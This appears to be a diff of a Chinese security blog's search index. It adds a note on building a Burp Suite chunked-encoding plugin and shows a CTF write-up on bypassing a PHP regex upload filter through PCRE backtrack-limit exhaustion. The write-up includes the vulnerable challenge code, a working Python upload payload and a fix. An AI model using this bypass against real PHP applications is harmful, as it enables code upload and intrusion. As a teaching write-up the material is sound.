@@ -1,6 +1,17 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[burpsuite安装分块传输插件]]></title>
+    <url>%2F2019%2F03%2F18%2Fburpsuite%E5%AE%89%E8%A3%85%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93%E6%8F%92%E4%BB%B6%2F</url>
+    <content type="text"><![CDATA[0x01 前言关于分块传输的用处不多解释，感谢c0ny1编写的自动化插件,项目地址：https://github.com/c0ny1/chunked-coding-converter 0x02 mvn package命令打包下载完成后可直接在pom.xml根目录执行mvn package进行打包，成功后生成一个target文件夹，里面有打包好的burpsuite插件。 IDE打包我这里就用的myeclipse。这里简述一下步骤首先通过file-&gt;import导入目标，选择Existing Maven Projects执行下一步，选择下载好的包含pom.xml的上级目录即可然后稍等一会即可在Packahe Explorer视图中看到整个项目然后在pom.xml上右键执行run as-&gt;maven package操作。如果没有maven package操作可以选择maven build，新建一个，填写Goals为package然后等待其打包完成即可，完成后在target目录中机会生成目标.jar文件 然后启动burpsuite，执行插件添加操作，选择刚才打包好的jar文件 安装成功会有提示]]></content>
+      <categories>
+        <category>web安全</category>
+      </categories>
+      <tags>
+        <tag>burpsuite</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[Bypass PCREWAF]]></title>
     <url>%2F2019%2F03%2F10%2FBypass-PCREWAF%2F</url>
     <content type="text"><![CDATA[0x00 前言起源于CODEBREAKING中一个ctf题目 easy - pcrewaf1234567891011121314151617181920&lt;?phpfunction is_php($data)&#123; return preg_match('/&lt;\?.*[(`;?&gt;].*/is', $data);&#125;if(empty($_FILES)) &#123; die(show_source(__FILE__));&#125;$user_dir = 'data/' . md5($_SERVER['REMOTE_ADDR']);$data = file_get_contents($_FILES['file']['tmp_name']);if (is_php($data)) &#123; echo "bad request";&#125; else &#123; @mkdir($user_dir, 0755); $path = $user_dir . '/' . random_int(0, 10) . '.php'; move_uploaded_file($_FILES['file']['tmp_name'], $path); header("Location: $path", true, 303);&#125; 0x01 题目分析题目大意为向服务器写入一个php文件，但是文件内容收到了限制1preg_match('/&lt;\?.*[(`;?&gt;].*/is', $data) 正则匹配了php标签，也就是说我们无法写入php代码，常规绕过思路是使用ASP标签&lt;% %&gt;或者script PHP标签&lt;script language=&quot;php&quot;&gt;来区分php代码，但是题目环境使用php7版本，这两种标签均被移除。 这里，PHITHON大神提到了一种很好的方式：PHP利用PCRE回溯次数限制绕过某些安全限制 0x02 利用pcre.backtrack_limit限制绕过pcrewaf常见正则有两种匹配形式 DFA: 从起始状态开始，一个字符一个字符地读取输入串，并根据正则来一步步确定至下一个转移状态，直到匹配不上或走完整个输入 NFA：从起始状态开始，一个字符一个字符地读取输入串，并与正则表达式进行匹配，如果匹配不上，则进行回溯，尝试其他状态 而php所使用的pcre库则采用了NFA方式 那么何为回溯呢？这里以此题的正则为例匹配&lt;?php phpinfo();//booglewadwdadadwad1/&lt;\?.*[(`;?&gt;].*/is 当其执行到第一个.*时，它会匹配到后面所有的内容而继续执行到 [(;?&gt;]时，前面匹配的全部内容显然不符合，此时便会进行回溯。直到匹配到;时符合条件 那么这里便有一个问题，如果回溯时无关字符无限长，那么岂不是会导致正则永远无法执行完成，导致正则dos。其实为了防止这种情况的发生，pcre对回溯次数做了限制，默认配置回溯次数pcre.backtrack_limit为1000000次。当回溯次数超过一百万次时，会返回false,那么这个题目便可构造超长的回溯次数使其返回false绕过文件内容检查。 0x03 payload1234567891011121314151617import requestsfrom io import BytesIOfrom hashlib import md5file = &#123; 'file':BytesIO(b'&lt;?php phpinfo();//'+b'a'*1000000)&#125;url = 'http://192.168.111.139:8088/'r=requests.post(url=url,files=file)m = md5()m.update('192.168.111.1')path = '/data/'+m.hexdigest()for i in xrange(0,10): u = url+path+'/'+str(i)+'.php' res = requests.get(u) if res.status_code == 200: print u 0x04 修复方法题目中使用了preg_match对字符串匹配，采用===判断返回值123if(is_php($input) === 0) &#123; ...&#125;]]></content>
